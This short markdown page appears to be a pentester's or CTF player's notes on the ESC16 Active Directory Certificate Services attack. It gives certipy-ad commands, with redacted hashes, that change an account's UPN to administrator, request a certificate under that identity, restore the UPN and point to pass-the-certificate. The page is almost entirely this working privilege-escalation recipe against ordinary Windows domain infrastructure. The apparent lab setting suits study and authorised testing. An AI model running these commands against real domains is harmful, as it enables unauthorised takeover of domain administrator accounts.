# ESC16

> idk how this works
## Change upn

Change you upn to `administrator`. Need `GenericWrite` on yourself, or use another account to do this

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn administrator update
```

Normally, `Administrator`'s upn is usually `Administrator` or `Administrator@domain.name`. If the above command does not work, add the `@domain.name`

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn Administrator@domain.name update
```

## Request cert

Request your own certificate, with upn `Administrator`

```sh
certipy-ad req -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -upn administrator -ca fluffy-DC01-CA -template User
```

## Restore upn

> This step is required.

Change you upn back to original

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn ca_svc update
```

After this step, you should get a cert that can authenticate as administrator. Do [#Pass the certificate]({{< relref "#pass-the-certificate" >}})